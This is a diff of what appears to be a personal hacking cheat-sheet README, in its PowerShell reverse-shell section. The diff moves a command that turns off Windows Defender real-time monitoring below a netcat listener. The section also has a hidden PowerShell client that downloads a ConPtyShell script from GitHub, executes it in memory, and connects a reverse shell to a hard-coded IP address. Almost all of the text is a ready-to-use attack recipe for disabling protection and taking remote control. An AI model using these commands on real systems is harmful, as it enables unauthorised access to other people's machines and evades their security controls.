@@ -29,17 +29,19 @@ Many of The Stuff presented here May/May-not work for you, this is more of a per
 
 ## ReverseShell (PowerShell) -
 
-### Disable Windows Realtime Protection -
-```
-Set-MpPreference -DisableRealtimeMonitoring $true
-```
 ### Listener (Linux Recomended)-
 ```
 sudo stty raw -echo; (stty size; cat) | nc -lvnp 443
+```
+### Disable Windows Realtime Protection -
+```
+Set-MpPreference -DisableRealtimeMonitoring $true
 ```
 ### Client -
 ```
 powershell -w hidden {IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 40.71.97.253 443}
 ```
+
+
 
 This Page May Have Loads of Error's since I suck at english so avoid em pls lol...
